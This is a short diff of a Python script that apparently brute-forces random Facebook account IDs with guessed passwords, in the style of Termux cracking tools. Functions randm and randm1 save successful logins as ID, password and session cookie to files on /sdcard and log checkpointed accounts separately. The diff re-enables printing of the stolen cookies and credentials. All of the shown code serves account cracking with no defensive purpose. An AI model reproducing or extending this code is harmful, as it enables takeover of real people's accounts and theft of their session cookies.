@@ -1164,11 +1164,11 @@ def randm(ids,psd,tl):
                     print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ") 
                     oks.append(ids)
                     open('/sdcard/RELAX-M1-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
             elif 'www.facebook.com' in q['error_msg']:
                 cps.append(ids)
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
+                print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
                 open('/sdcard/RELAX-RN-DIE.txt','a').write(ids+'|'+pas+'\n')
         loop+=1
     except Exception as e:
@@ -1243,11 +1243,11 @@ def randm1(ids,psd,tl):
                     print(f"\r\r{red}[{white}√{red}] {red}[{green}ALIVE{red}] {green}{uid} {white}| {green}{pas} ")
                     oks.append(ids)
                     open('/sdcard/RELAX-M2-RN-LIVE.txt','a').write(uid+'|'+pas+'|'+ckkk+'\n')
-                    #print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
+                    print(f"\r\r{red}[{white}√{red}] {red}[{green}COOKIE{red}]{green} ={white} {coki}")
                     break
             elif 'www.facebook.com' in q['error_msg']:
                 cps.append(ids)
-                #print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
+                print(f"\r\r{red}[{white}√{red}] {red}DIE {uid} | {pas} ")
                 open('/sdcard/RELAX-RN-DIE.txt','a').write(ids+'|'+pas+'\n')                
         loop+=1
     except requests.exceptions.ConnectionError:
